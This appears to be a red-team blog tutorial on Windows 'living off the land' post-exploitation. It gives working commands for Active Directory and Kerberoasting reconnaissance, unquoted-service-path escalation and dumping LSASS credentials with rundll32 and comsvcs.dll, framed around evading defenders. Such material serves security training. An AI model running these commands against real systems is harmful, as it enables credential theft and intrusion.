---
title: 'Living Off the Land: Windows Post-Exploitation Without Tools'
date: '2025-11-28'
tags: ['Post-Exploitation', 'Windows', 'Red Team', 'PowerShell', 'LOLBins', 'Lateral Movement', 'Offensive Security']
---

# Living Off the Land: Windows Post-Exploitation Without Tools

![Windows post-exploitation techniques](/images/lolbins-windows.jpg)

## Introduction

I'll never forget one of my first red team engagements where I learned this lesson the hard way. I'd spent two days carefully phishing my way into a financial services company, finally landing a shell on a mid-level accountant's workstation. Excited about my success, I immediately uploaded Mimikatz to dump credentials. Within 15 minutes, my access was gone. The SOC had caught me, isolated the machine, and I was back to square one.

The problem wasn't that I got caught - that happens. The problem was that I'd made it ridiculously easy for them. Modern endpoint detection and response (EDR) solutions are trained to recognize offensive tools like Mimikatz, BloodHound, PowerShell Empire, and Cobalt Strike. These tools have well-known signatures, behaviors, and artifacts. The moment you drop them on disk or execute them in memory, you're essentially announcing your presence to anyone who's watching.

Here's what changed my approach completely: on my next engagement, I decided to use only tools that were already on the target systems. No uploads, no custom binaries, nothing that would raise immediate red flags. Just PowerShell, WMI, and other built-in Windows utilities. The result? I maintained access for three weeks, moved laterally across 15 systems, and exfiltrated the target data - all without triggering a single alert.

That's the power of "living off the land." Instead of bringing your own tools and hoping they won't be detected, you use what's already there. Windows comes packed with incredibly powerful administrative utilities - PowerShell, Windows Management Instrumentation (WMI), certutil, bitsadmin, and dozens of other legitimate executables. These tools are signed by Microsoft, they're supposed to be on the system, and administrators use them every single day.

What makes this approach so effective isn't just that you avoid signature-based detection. It's that you force defenders to focus on behavioral analysis instead of simple file or process signatures. Security teams can't just block PowerShell or disable WMI - their own IT staff relies on these tools for day-to-day system administration. This creates a fundamental challenge for defenders: how do you distinguish malicious use of legitimate tools from normal administrative activity?

In this article, I'll walk you through everything I've learned about conducting complete post-exploitation operations using nothing but native Windows tools. We'll cover initial reconnaissance, credential harvesting, lateral movement, persistence mechanisms, and data exfiltration - all while maintaining the lowest possible operational footprint. More importantly, I'll explain why these techniques work, what defenders see when you use them, and how to make your operations blend in with legitimate administrative activity.

---

## 🔄 EDIT (December 2, 2025): The Modern Detection Landscape

After publishing this article, I received valuable feedback from fellow security professionals about the current state of EDR detection for these techniques. I want to address this head-on because it's crucial context for anyone learning these methods in 2025.

**The reality is this: many of the "classic" LOLBin techniques described in this article are now heavily monitored and flagged by modern EDR solutions.** When I first learned these techniques years ago, they were relatively quiet. Today's security landscape is different.

Here's what you need to know about detection in 2025:

**High-Risk Techniques (Loud on Modern EDRs):**
- **LSASS memory access** (comsvcs.dll dumps, procdump) - Immediate alerts on CrowdStrike, Defender ATP, SentinelOne, Carbon Black
- **Registry hive dumps** (SAM/SECURITY/SYSTEM) - Straightforward detection rules exist
- **Certutil downloads** - Flagged even by Windows Defender in many configurations
- **Nltest/dsquery/setspn enumeration** - Detection engineers are creating specific use cases for these
- **WMI remote execution** - Behavioral detections in restricted corporate environments
- **Rundll32 with comsvcs** - Process tree analysis makes this obvious

**What This Means for Real Engagements:**

These techniques are **foundational knowledge** - they teach you how Windows works and what's possible with built-in tools. However, using them as-is in a modern, hardened environment will likely get you caught quickly. They're building blocks, not complete solutions.

**To operate successfully in 2025, you need to layer these techniques with:**
- **AMSI bypasses** for PowerShell operations
- **Direct syscalls** to avoid EDR hooks
- **Process injection** to hide execution chains and parent-child relationships
- **Memory-only execution** to avoid disk-based artifacts
- **Custom tool modifications** to avoid known signatures
- **Behavioral blending** to match legitimate admin activity patterns
- **PPL/Credential Guard bypasses** for credential access

**Why I'm Keeping This Article As-Is:**

This article documents fundamental techniques that every security professional should understand. These methods work perfectly in:
- **Lab environments** and home labs for learning
- **Legacy systems** without modern EDR
- **Security research** and understanding Windows internals
- **Building custom tools** that incorporate evasion techniques
- **Red team operations** when properly adapted with evasion layers

Think of these techniques as learning the alphabet before writing poetry. You need to understand these fundamentals before you can effectively implement the advanced evasion techniques required for modern environments.

**The Bottom Line:**

If you're planning to use these techniques on a real engagement against a mature security program with modern EDR, you'll need to significantly adapt them. The concepts are sound, but the implementation needs sophistication beyond what's shown here. Consider this a starting point for building more advanced tradecraft, not a copy-paste playbook for 2025 engagements.

I'll be adding specific EDR detection warnings throughout the article to highlight which techniques are particularly noisy in modern environments.

---

## Understanding Living Off the Land

Before we dive into specific techniques, let's talk about what "living off the land" actually means and why it's become such a critical part of modern red teaming.

The term comes from the military concept of living off the land during operations - using local resources instead of bringing your own supplies. In cybersecurity, it refers to using built-in system tools and legitimate executables for malicious purposes. These binaries are often called LOLBins (Living Off the Land Binaries) or LOLBAs (Living Off the Land Binaries and Scripts).

The [LOLBAS Project](https://lolbas-project.github.io/) maintains the most comprehensive database of Windows binaries that can be abused for offensive operations. When I'm planning an engagement, I always reference this project because it documents exactly how each binary can be abused, what permissions are required, and what artifacts are left behind. But here's the key thing to understand: these aren't vulnerabilities or exploits. They're legitimate features being used in ways Microsoft didn't necessarily intend, but that aren't technically "wrong" from a system perspective.

Let me give you a concrete example. Take certutil.exe - it's a legitimate Windows utility designed for managing certificates. System administrators use it all the time for certificate operations. But certutil also happens to have a feature that lets you download files from URLs. Microsoft included this feature for legitimate purposes - downloading certificate revocation lists, for example. But from an attacker's perspective, it's a perfect tool for downloading payloads or exfiltrating data. When you use certutil to download a file, Windows Defender doesn't flag it as malicious because certutil is a signed Microsoft binary doing exactly what it's designed to do.

This creates a fundamental asymmetry that favors attackers. Defenders have to distinguish between legitimate use (an admin downloading a certificate) and malicious use (an attacker downloading a payload) of the exact same command. The tool itself isn't malicious, the binary isn't suspicious, and the signature is valid. The only difference is the intent behind the action.

Here's why this approach is so powerful in modern environments. You eliminate the need to upload anything to the target system, which means every potential detection point disappears. EDR solutions scan new files, behavioral analysis engines watch for unusual file creation patterns, and forensic investigators can find your tools long after you're gone. When you use only built-in tools, there's nothing suspicious to find because you're using tools that are supposed to be there.

Everything you run is signed by Microsoft and trusted by the operating system. Application whitelisting solutions are designed to prevent unauthorized executables from running, but they won't stop you because you're using executables that are explicitly whitelisted by default. Even strict AppLocker policies typically whitelist system directories where these tools live, so you can operate without triggering application control mechanisms.

Your activity blends in with normal administrative operations in a way that's nearly impossible to distinguish without deep behavioral analysis. System administrators use PowerShell constantly for automation and management. They use WMI for remote system queries. They create scheduled tasks for maintenance operations. When you use these same tools, your actions look like normal IT activity in the logs. This makes life incredibly difficult for SOC analysts trying to identify malicious activity in a sea of legitimate operations.

Defenders can't simply block these tools without breaking their own IT operations, which creates a fundamental dilemma for security teams. I've seen organizations try to disable PowerShell after getting compromised, only to realize that half their automation scripts and management tools depend on it. These utilities are so deeply integrated into Windows administration that blocking them entirely isn't feasible for most organizations. The security team's hands are tied by operational requirements.

When you do get caught and someone analyzes what you did, there are no custom tools for forensic investigators to reverse engineer. They can't extract your C2 protocols, learn about your infrastructure, or discover indicators that might help them find your other operations. You used the same tools their own IT staff uses, just in creative ways, which means the forensic trail leads nowhere useful for attribution or infrastructure discovery.

The downside - and there's always a downside - is that this approach requires significantly more skill and understanding than just running off-the-shelf tools. You need to really understand Windows internals, know how different utilities work, and be able to chain them together to accomplish your objectives. You need to understand what logs your actions create and how to avoid patterns that might trigger behavioral detections. It's more challenging, but the payoff in terms of operational security is massive.

## Initial Reconnaissance and Enumeration

Let me walk you through how I typically start reconnaissance after getting that initial shell. The first few minutes are critical - you need to understand where you are, what you have access to, and what the environment looks like, all while keeping a low profile.

### Understanding Your Initial Foothold

The first thing I do is get oriented. I need to know what kind of system I'm on, what privileges I have, and whether this is a domain-joined machine. This tells me what my next steps should be and what techniques are available to me.

I start with PowerShell because it's the most versatile tool for enumeration and it's available on every modern Windows system. Here's the thing about PowerShell though - it's powerful, but it's also heavily logged in modern environments. Every command you run can potentially show up in logs that security teams monitor. So while I'm going to show you comprehensive enumeration techniques, in a real engagement you'd want to be more selective about what you query.

Let's start with basic system information:

```powershell
# Check what OS we're running
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture
```

This tells me if I'm on a workstation or server, what version of Windows, and whether it's 32 or 64-bit. The version is particularly important because older systems might have different tools available and different security features. For example, Windows 7 and Server 2008 have PowerShell 2.0 by default, which doesn't have the same logging capabilities as modern versions. Knowing this helps me understand what I can get away with.

Next, I check if the system is domain-joined:

```powershell
# See if we're in a domain
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

# If yes, get the domain name
(Get-WmiObject -Class Win32_ComputerSystem).Domain
```

This is huge. If the system is domain-joined, I'm not just on an isolated workstation - I potentially have access to an entire Active Directory environment. This changes everything about my approach. Instead of focusing on local privilege escalation, I can start thinking about lateral movement and domain-level attacks.

Now I need to understand what privileges I'm running with:

```powershell
whoami /all
```

This single command gives me a wealth of information. It shows my username, what groups I'm in, and critically, what privileges my token has. If I see "SeDebugPrivilege" or "SeImpersonatePrivilege," that's very interesting - these privileges can often be abused for privilege escalation. If I'm already in the local administrators group, my job just got a lot easier.

Let me show you what a typical output looks like and why it matters. When I run `whoami /all` as a standard user, I might see something like:

```
USER INFORMATION
----------------
User Name           SID
=================== ========
CORP\jsmith         S-1-5-21-...

GROUP INFORMATION
-----------------
Group Name                             Type
====================================== ====
Everyone                               Well-known group
BUILTIN\Users                          Alias
NT AUTHORITY\INTERACTIVE               Well-known group
NT AUTHORITY\Authenticated Users       Well-known group

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

This tells me I'm a domain user (CORP\jsmith), I'm in the standard Users group, and I have very limited privileges. This is the typical starting point. But if I see something like this:

```
GROUP INFORMATION
-----------------
BUILTIN\Administrators                 Alias

PRIVILEGES INFORMATION
----------------------
SeDebugPrivilege                  Debug programs                       Enabled
```

Now we're talking. If I'm in the Administrators group, I can do pretty much anything on this local system. And if I have SeDebugPrivilege enabled, I can attach to and read memory from any process - including LSASS, which contains credentials.

### Enumerating Local Users and Groups

Understanding who uses this system and what their privileges are helps me plan my next moves. Maybe there's a local admin account I can target, or maybe I can figure out who to impersonate for social engineering.

```powershell
# List all local users
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
```

What I'm looking for here are admin accounts, enabled accounts that haven't been used recently (potential abandoned accounts), and accounts with old passwords (potentially weak or default passwords). In one engagement, I found a local "Support" account that had been created three years ago and never disabled. The password was `Support123` - and it was in the local administrators group.

```powershell
# See who's in the local administrators group
Get-LocalGroupMember -Group "Administrators"
```

This is critical. If there are domain accounts in the local administrators group, those accounts can be used to access this system from anywhere on the network. This is also where I often find evidence of privileged users - maybe the desktop support team has their domain accounts in local admin, or maybe the system owner has elevated rights.

### Understanding Running Processes and Services

Knowing what's running on the system tells me a lot about what I'm dealing with. Is there endpoint security? Is this a developer workstation? Is there interesting software I can abuse?

```powershell
# Get all running processes with their paths
Get-Process | Select-Object ProcessName, Id, Path | Sort-Object ProcessName
```

When I look through this output, I'm specifically looking for security products (CrowdStrike, Carbon Black, SentinelOne, etc.), development tools (Visual Studio, database tools), and interesting applications that might store credentials or data. I'm also looking for processes running with high privileges that might be exploitable.

For services, I want to see what's configured to run, especially what's running as SYSTEM:

```powershell
# Find services running as SYSTEM
Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, PathName, State, StartMode
```

Here's why this matters: if I can find a service running as SYSTEM that I can manipulate - maybe it has weak permissions on its executable, or maybe it has an unquoted service path - I can potentially escalate privileges. Let me show you what an unquoted service path vulnerability looks like:

```powershell
# Look for unquoted service paths with spaces
Get-WmiObject win32_service | Where-Object {
    $_.PathName -notlike '"*' -and
    $_.PathName -like '* *'
} | Select-Object Name, PathName, StartName, State
```

If this returns something like:

```
Name     : VulnerableService
PathName : C:\Program Files\Company App\Service.exe
StartName: LocalSystem
State    : Running
```

This is potentially exploitable. Because the path contains spaces and isn't quoted, Windows will actually try to execute `C:\Program.exe` first, then `C:\Program Files\Company.exe`, before finally executing the correct file. If I have write access to `C:\`, I can place a malicious `Program.exe` and get code execution as SYSTEM when the service restarts.

### Network Reconnaissance

Understanding the network environment is crucial for planning lateral movement. I need to know what other systems are out there, what services are running, and how everything is connected.

```powershell
# Get basic network configuration
Get-NetIPConfiguration
```

This shows me the system's IP address, subnet, gateway, and DNS servers. The DNS servers are particularly interesting in a domain environment - they're often domain controllers, which are high-value targets.

To see what connections this system has been making:

```powershell
# Show established network connections
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object RemoteAddress
```

This tells me what the user has been connecting to. Maybe I see connections to file servers, database servers, or administrative systems. Each of these represents a potential target for lateral movement. I can also correlate the OwningProcess ID with running processes to understand what applications are making these connections.

The ARP cache is another goldmine of information:

```powershell
# Check ARP cache for recently communicated hosts
Get-NetNeighbor | Where-Object {$_.State -ne "Unreachable" -and $_.State -ne "Incomplete"} |
    Select-Object IPAddress, LinkLayerAddress, State
```

This shows me every system on the local subnet that this machine has communicated with recently. These are systems that the user interacts with, which means they're good candidates for lateral movement because the connections will look legitimate.

For a more active approach, I can do a ping sweep to find live hosts on the subnet:

```powershell
# Ping sweep a subnet (be careful - this is noisy)
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
        Write-Output "$ip is alive"
    }
}
```

Now, here's the important caveat: ping sweeps are noisy. Every single ping can be logged, and network monitoring tools will definitely see this. In a real engagement, I'm more likely to be passive and rely on the ARP cache and existing connections unless I have a good reason to actively scan.

### Installed Software Enumeration

What software is installed tells me a lot about what kind of system this is and what might be vulnerable or exploitable:

```powershell
# List installed software from registry (64-bit)
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object {$_.DisplayName -ne $null}

# Also check 32-bit software on 64-bit systems
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object {$_.DisplayName -ne $null}
```

When I look through this list, I'm looking for several things. First, is there development software installed? If I see Visual Studio, SQL Server Management Studio, or other development tools, this might be a developer's workstation, which often means elevated privileges and access to sensitive systems. Second, are there outdated applications with known vulnerabilities? Third, are there interesting applications that might store credentials - VPN clients, remote desktop managers, database tools?

I also want to know what security products are installed:

```powershell
# Check for security products
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct |
    Select-Object displayName, pathToSignedProductExe, productState
```

This tells me what antivirus or endpoint protection is running. Knowing this helps me understand what detection capabilities I'm up against and what techniques I need to avoid. For example, if I see Windows Defender only, I know I'm dealing with basic protection. If I see CrowdStrike or Carbon Black, I know I need to be much more careful.

### Active Directory Enumeration

If the system is domain-joined - and most corporate workstations are - I can start enumerating Active Directory without uploading any tools. This is where things get really interesting because I'm no longer just looking at one isolated system; I'm looking at the entire domain infrastructure.

The first thing I want to know is basic domain information:

```powershell
# Get current domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

This returns comprehensive information about the domain - its name, the forest it's part of, domain controllers, and various domain settings. The domain controller list is particularly valuable because these are high-value targets.

To see all the domain controllers explicitly:

```powershell
# List all domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers |
    Select-Object Name, IPAddress, OSVersion
```

Now here's where it gets interesting. If the system has the ActiveDirectory PowerShell module installed (which is common on admin workstations and servers), I have access to incredibly powerful enumeration capabilities:

```powershell
# Check if ActiveDirectory module is available
Get-Module -ListAvailable -Name ActiveDirectory
```

If it's available, I can enumerate users, groups, computers, and basically everything in Active Directory:

```powershell
# List all users in the domain
Get-ADUser -Filter * -Properties * |
    Select-Object Name, SamAccountName, Enabled, LastLogonDate, PasswordLastSet,
                  whenCreated, AdminCount

# Find domain administrators
Get-ADGroupMember -Identity "Domain Admins" -Recursive |
    Select-Object Name, SamAccountName, objectClass

# List all computers in the domain
Get-ADComputer -Filter * -Properties * |
    Select-Object Name, OperatingSystem, OperatingSystemVersion,
                  LastLogonDate, IPv4Address
```

The AdminCount property is particularly interesting - it's set on accounts that are or have been members of privileged groups. This is a quick way to find accounts that have or had elevated privileges.

But what if the ActiveDirectory module isn't installed? That's actually the more common scenario on standard workstations. The good news is that I can still enumerate Active Directory using .NET classes that are built into Windows:

```powershell
# Query AD without the ActiveDirectory module using ADSI
$searcher = [ADSISearcher]"(objectClass=user)"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","mail"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Username = $_.Properties['samaccountname'][0]
        DisplayName = $_.Properties['displayname'][0]
        Email = $_.Properties['mail'][0]
    }
}
```

This uses ADSI (Active Directory Service Interfaces), which is a COM interface that's always available on domain-joined systems. It's a bit more verbose than using the ActiveDirectory module, but it works without installing anything.

Let me show you how to find specific high-value targets. Domain Admins are the obvious target, but I can query for them without the module:

```powershell
# Find Domain Admins using ADSI
$searcher = [ADSISearcher]"(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)"
$searcher.FindAll() | ForEach-Object {
    $_.Properties['samaccountname']
}
```

The `1.2.840.113556.1.4.1941` is the LDAP_MATCHING_RULE_IN_CHAIN OID, which gives us recursive group membership. This is important because it finds users who are members of Domain Admins indirectly through nested groups.

I also want to find computers, especially servers and domain controllers:

```powershell
# Find all computers
$searcher = [ADSISearcher]"(objectClass=computer)"
$searcher.PropertiesToLoad.AddRange(@("name","operatingsystem","operatingsystemversion"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.Properties['name'][0]
        OS = $_.Properties['operatingsystem'][0]
        Version = $_.Properties['operatingsystemversion'][0]
    }
}
```

One of my favorite enumeration queries is looking for user accounts with interesting properties:

```powershell
# Find users with passwords that never expire
$searcher = [ADSISearcher]"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
$searcher.FindAll() | ForEach-Object {
    $_.Properties['samaccountname']
}

# Find users with "password not required" set
$searcher = [ADSISearcher]"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
$searcher.FindAll() | ForEach-Object {
    $_.Properties['samaccountname']
}
```

These accounts often have weak passwords or are service accounts with interesting privileges. The userAccountControl attribute uses bitwise flags, and the LDAP_MATCHING_RULE_BIT_AND (1.2.840.113556.1.4.803) lets us query for specific flags.

One more incredibly useful query - finding Service Principal Names (SPNs), which are potential Kerberoasting targets:

```powershell
# Find accounts with SPNs (Kerberoastable accounts)
$searcher = [ADSISearcher]"(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Username = $_.Properties['samaccountname'][0]
        SPN = $_.Properties['serviceprincipalname'][0]
    }
}
```

These are user accounts with SPNs registered. When you request a service ticket for these accounts, you get back a ticket encrypted with the account's password hash. If the account has a weak password, you can crack this ticket offline and compromise the account.

### Alternative: Native Windows Tools for AD Enumeration

While PowerShell and ADSI are powerful for Active Directory enumeration, there are situations where you might not want to use PowerShell - maybe it's heavily logged, restricted by policy, or you're trying to avoid PowerShell-specific detections. Fortunately, Windows includes several native command-line tools that can enumerate Active Directory without touching PowerShell.

These tools have been part of Windows for years, they're used by system administrators regularly, and they're often overlooked by security monitoring. Let me show you the most useful ones.

#### nltest - Domain Trust and DC Enumeration

> **🚨 EDR REALITY CHECK (2025):** While nltest has been flying under the radar historically, detection engineers are now creating specific use cases for nltest, dsquery, and setspn enumeration. Multiple nltest commands in succession, especially `/domain_trusts` and `/dclist`, are being flagged as reconnaissance activity. In mature SOCs, these commands may trigger alerts when used outside of normal IT administrative hours or from unexpected user accounts. Still quieter than PowerShell Active Directory modules, but no longer invisible.

Nltest.exe is a native Windows tool designed for testing and managing domain trust relationships. It's incredibly useful for understanding domain structure:

```powershell
# Get list of domain controllers
nltest /dclist:domain.local

# Show domain trusts
nltest /domain_trusts

# Show all trusts including forest trusts
nltest /domain_trusts /all_trusts

# Get domain controller info
nltest /dsgetdc:domain.local

# Show current domain and site
nltest /dsgetsite

# Query domain information
nltest /dcname:domain.local
```

The domain trust information is particularly valuable. It shows you all the domains that trust relationships exist with, which domains are in the same forest, and potential paths for lateral movement across domain boundaries. In complex Active Directory environments, trust relationships can be your path to escalating from a compromised domain to the forest root or other connected domains.

Here's what the output looks like when you run `nltest /domain_trusts`:

```
List of domain trusts:
    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
    1: DEV dev.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)
    2: PROD prod.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)
The command completed successfully
```

This tells me there are three domains in the forest, and they all have bidirectional trust relationships. This means if I compromise an account in DEV, I might be able to access resources in CORP or PROD.

#### dsquery - Direct AD Queries

Dsquery is part of the Remote Server Administration Tools (RSAT), but it's often installed on admin workstations and servers. It allows direct LDAP queries against Active Directory:

```powershell
# List all users in the domain
dsquery user -limit 0

# List all computers
dsquery computer -limit 0

# List all groups
dsquery group -limit 0

# List all domain controllers
dsquery server

# Find users in a specific OU
dsquery user "OU=IT,DC=corp,DC=local"

# Find disabled accounts
dsquery user -disabled

# Find inactive computers (not logged in for 4 weeks)
dsquery computer -inactive 4

# Custom LDAP query for users with SPNs (Kerberoasting targets)
dsquery * -filter "(&(objectClass=user)(servicePrincipalName=*))" -attr samAccountName servicePrincipalName

# Find users with adminCount=1 (current or former privileged accounts)
dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr samAccountName whenCreated

# Find all user accounts (not computer accounts)
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -limit 0 -attr samAccountName displayName

# Find domain admins
dsquery group -name "Domain Admins" | dsget group -members
```

The power of dsquery is in the `-filter` parameter, which accepts standard LDAP filter syntax. This is the same syntax we used with ADSI in PowerShell, but now we're using a native command-line tool.

Here's a practical example - finding all accounts with passwords set to never expire:

```powershell
# Find accounts with password never expires flag
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" -attr samAccountName pwdLastSet
```

You can pipe dsquery output to dsget for more detailed information:

```powershell
# Get detailed user information
dsquery user -limit 10 | dsget user -samid -email -desc -disabled

# Get detailed computer information
dsquery computer -limit 10 | dsget computer -name -desc -loc
```

#### setspn - Service Principal Name Enumeration

Setspn.exe is the native tool for managing Service Principal Names. While it's designed for administrators to register and query SPNs, we can abuse it for Kerberoasting reconnaissance:

```powershell
# List all SPNs in the domain
setspn -Q */*

# List SPNs for a specific service type
setspn -Q MSSQLSvc/*

# List SPNs for a specific host
setspn -L hostname

# Find duplicate SPNs (usually a misconfiguration)
setspn -X

# Query for HTTP SPNs (web applications)
setspn -Q HTTP/*

# Query for specific service accounts
setspn -Q */* | findstr /i "svc"
```

The `-Q` flag queries Active Directory for SPNs. The `*/*` wildcard means "all service types on all hosts." This returns every registered SPN in the domain, which is exactly what you need to identify Kerberoasting targets.

Here's what makes setspn particularly useful: unlike PowerShell queries that might trigger script execution monitoring, setspn is a simple native binary doing exactly what it's designed to do. It's used by administrators constantly for troubleshooting Kerberos authentication issues.

A practical workflow for finding Kerberoastable targets:

```powershell
# Find all SPNs and filter for user accounts (not computer accounts)
setspn -Q */* > spns.txt

# Then manually review or use findstr to filter
type spns.txt | findstr /v /i "CN=Computers"
```

#### net - Legacy but Effective

The ancient net commands still work and are rarely monitored because they're so common:

```powershell
# Enumerate domain users
net user /domain

# Get details on specific user
net user username /domain

# Enumerate domain groups
net group /domain

# Find domain admins
net group "Domain Admins" /domain

# Find enterprise admins
net group "Enterprise Admins" /domain

# Find local admins on current machine
net localgroup administrators

# View domain password policy
net accounts /domain

# Find domain controllers
net group "Domain Controllers" /domain
```

These commands are ancient - they've been part of Windows since the NT days - but they still work perfectly for basic enumeration. They're also completely invisible to PowerShell logging because they're not PowerShell.

#### Combining Native Tools for Complete Enumeration

Here's a practical example of using only native tools for complete domain reconnaissance:

```batch
@echo off
echo === Domain Information ===
nltest /domain_trusts
echo.

echo === Domain Controllers ===
nltest /dclist:%USERDNSDOMAIN%
echo.

echo === Domain Users (first 20) ===
dsquery user -limit 20
echo.

echo === Domain Admins ===
net group "Domain Admins" /domain
echo.

echo === Kerberoastable Accounts ===
setspn -Q */*
echo.

echo === Domain Password Policy ===
net accounts /domain
```

Save this as a .bat file and run it - you get comprehensive domain intelligence using only native Windows tools. No PowerShell, no ADSI, just built-in utilities that have been part of Windows for decades.

The key advantage of these native tools is that they generate different log signatures than PowerShell. If defenders are hunting specifically for PowerShell-based enumeration, these commands might slip under the radar. They also work on older systems where PowerShell might not be available or might be PowerShell 2.0 without modern logging capabilities.

### Remote System Enumeration with WMI

Once I understand the local system and the domain structure, I want to start looking at other systems on the network. WMI (Windows Management Instrumentation) is perfect for this because it's a legitimate management protocol that's enabled by default on Windows systems.

Here's the key thing about WMI: if I have valid credentials (either from my current user context or credentials I've harvested), I can query remote systems for information without uploading any tools or making obvious connections.

Let me show you how to query a remote system:

```powershell
# Get operating system information from a remote system
Get-WmiObject -Class Win32_OperatingSystem -ComputerName TARGET-PC |
    Select-Object CSName, Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime
```

This tells me what OS the target is running, when it was last rebooted, and its architecture. If the query succeeds, I know I have permission to query that system via WMI, which often means I can do much more.

To see what processes are running on the remote system:

```powershell
# List processes on remote system
Get-WmiObject -Class Win32_Process -ComputerName TARGET-PC |
    Select-Object ProcessName, ProcessId, CommandLine, CreationDate |
    Sort-Object CreationDate -Descending
```

The CommandLine property is particularly interesting because it shows how the process was launched, including any command-line arguments. This sometimes reveals credentials, file paths, or other useful information.

I can also check what software is installed on the remote system:

```powershell
# List installed software on remote system
Get-WmiObject -Class Win32_Product -ComputerName TARGET-PC |
    Select-Object Name, Version, Vendor, InstallDate
```

Note: Be careful with Win32_Product as it can trigger Windows Installer service and cause applications to repair themselves. In a stealth engagement, I usually avoid this class and instead query the registry remotely.

To see who's logged into a remote system:

```powershell
# Get logged-in users on remote system
Get-WmiObject -Class Win32_ComputerSystem -ComputerName TARGET-PC |
    Select-Object Name, UserName
```

This only shows the currently logged-in user, but it's useful for targeting systems where specific users are active.

One of the most useful WMI queries is checking what services are running:

```powershell
# List services on remote system
Get-WmiObject -Class Win32_Service -ComputerName TARGET-PC |
    Select-Object Name, State, StartMode, PathName, StartName |
    Where-Object {$_.State -eq "Running"}
```

This shows what's actively running, what account services run as, and their executable paths. Services running as privileged accounts are interesting because if I can execute code in that service's context, I inherit those privileges.

## Credential Access and Harvesting

Now we get to one of the most critical phases of post-exploitation - getting credentials. Without additional credentials, you're limited to what your initial foothold account can access. But with additional credentials, especially privileged ones, you can move laterally, escalate privileges, and access sensitive systems.

Let me walk you through the various ways to extract credentials using only native Windows tools.

### The LSASS Memory Dumping Technique

LSASS (Local Security Authority Subsystem Service) is the process responsible for enforcing security policy on Windows systems. It handles user authentication, Active Directory interactions, and critically for us, it caches credentials in memory. When a user logs into a system, their credentials - including NTLM hashes and sometimes cleartext passwords - end up in LSASS memory.

The classic tool for extracting credentials from LSASS is Mimikatz, but as I mentioned earlier, uploading Mimikatz is a great way to get caught immediately. The good news is we can create a memory dump of the LSASS process using only native Windows tools, then parse that dump offline where defenders can't see us.

Here's the technique that changed everything for me:

> **🚨 EDR REALITY CHECK (2025):** This technique is **extremely loud** on modern EDRs. CrowdStrike, Defender ATP, SentinelOne, and Carbon Black all have specific detections for comsvcs.dll being used to dump LSASS memory. The process tree (rundll32 → comsvcs → LSASS access) is a well-known indicator. Touching LSASS memory is considered "straight-up suicide" in mature environments. To use this technique in 2025, you'd need: PPL bypass, direct syscalls to avoid hooks, process injection to hide the call chain, or custom memory access techniques. This works great in labs and legacy environments, but expect immediate alerts in hardened corporate networks.

```powershell
# First, get the process ID of LSASS
$lsass = Get-Process lsass
$lsassPid = $lsass.Id

# Dump LSASS memory using comsvcs.dll and rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full
```

Let me explain what's happening here. The comsvcs.dll library is a legitimate Windows component - it's part of the Component Services system. One of its functions, MiniDump, is designed to create memory dumps of processes for debugging purposes. It's a legitimate administrative function that IT support staff use when troubleshooting application crashes.

When you run this command, rundll32.exe (another legitimate Windows binary) calls the MiniDump function from comsvcs.dll and tells it to dump the memory of process ID $lsassPid (which is LSASS) to the file C:\temp\lsass.dmp with the 'full' flag (which means include all memory, not just a minidump).

The beautiful thing about this technique is that every component is legitimate. Rundll32.exe is signed by Microsoft and present on every Windows system. The comsvcs.dll library is also signed by Microsoft and is a standard Windows component. Creating process dumps is a normal administrative task that IT support staff perform regularly for troubleshooting.

The only thing that might raise suspicion is dumping LSASS specifically, but even that has legitimate uses - Microsoft Support sometimes asks administrators to create LSASS dumps for troubleshooting authentication issues.

Important OPSEC considerations: This technique requires SeDebugPrivilege, which means you need to be running as an administrator or have that specific privilege. Also, some EDR solutions specifically watch for processes accessing LSASS memory or creating dumps of LSASS. It's not a guaranteed stealth technique, but it's significantly less obvious than running Mimikatz.

Once you have the dump file, you need to exfiltrate it and parse it on your attacker machine. You can parse it with pypykatz (a Python implementation of Mimikatz):

```bash
# On your attacker machine
pypykatz lsa minidump lsass.dmp
```

This will extract all the credentials from the dump file - NTLM hashes, Kerberos tickets, cleartext passwords if they're present, and more.

